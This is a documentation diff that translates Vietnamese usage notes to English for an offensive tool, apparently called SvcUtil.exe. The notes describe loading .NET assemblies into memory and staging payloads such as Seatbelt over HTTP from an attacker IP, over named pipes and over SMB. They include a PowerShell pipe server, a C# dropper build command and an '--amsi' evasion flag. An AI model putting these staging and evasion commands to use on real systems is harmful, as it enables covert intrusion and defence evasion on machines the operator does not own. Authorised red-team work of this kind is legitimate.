@@ -413,9 +413,9 @@ SvcUtil.exe --exec-asm --stage-http http://10.10.14.1/seatbelt.b64
 SvcUtil.exe --exec-asm --stage-pipe mypipe
 ```
 
-**Named pipe staging** — SvcUtil kết nối như pipe client (`NamedPipeClientStream`). Cần có một pipe server chạy trước để phục vụ payload bytes. Có thể tạo pipe server bằng nhiều cách:
+**Named pipe staging** — SvcUtil connects as a pipe client (`NamedPipeClientStream`). A pipe server must be running before SvcUtil connects. There are several ways to create one:
 
-**Cách 1: PowerShell (đã có shell trên target)**
+**Option 1: PowerShell (already have a shell on target)**
 
 ```powershell
 $bytes = [IO.File]::ReadAllBytes("C:\staging\Seatbelt.exe")
@@ -425,9 +425,9 @@ $pipe.Write($bytes, 0, $bytes.Length)
 $pipe.Close()
 ```
 
-**Cách 2: C# dropper (compile riêng, chạy trước SvcUtil)**
+**Option 2: C# dropper (compile separately, run before SvcUtil)**
 
-Lưu thành `PipeDropper.cs`, build bằng csc.exe:
+Save as `PipeDropper.cs`, build with csc.exe:
 
 ```csharp
 using System;
@@ -459,16 +459,16 @@ class PipeDropper
 # Build
 csc.exe /out:PipeDropper.exe PipeDropper.cs
 
-# Chạy dropper (đợi SvcUtil kết nối)
+# Run dropper (waits for SvcUtil to connect)
 PipeDropper.exe Seatbelt.exe mypipe
 
-# Cửa sổ khác — SvcUtil đọc từ pipe
+# In another window — SvcUtil reads from pipe
 SvcUtil.exe --stage-pipe mypipe --exec-asm --amsi -- -group=all
 ```
 
-**Cách 3: Remote qua SMB (từ attacker)**
+**Option 3: Remote via SMB (from attacker machine)**
 
-`--stage-pipe fileserver/mypipe` kết nối đến `\\fileserver\pipe\mypipe`, cho phép stage payload từ máy khác trong cùng mạng mà không cần HTTP.
+`--stage-pipe fileserver/mypipe` connects to `\\fileserver\pipe\mypipe`, allowing payload staging from another machine on the same network without HTTP.
 
 **Passing arguments to the assembly** — use `--` to separate SvcUtil flags from assembly arguments:
 
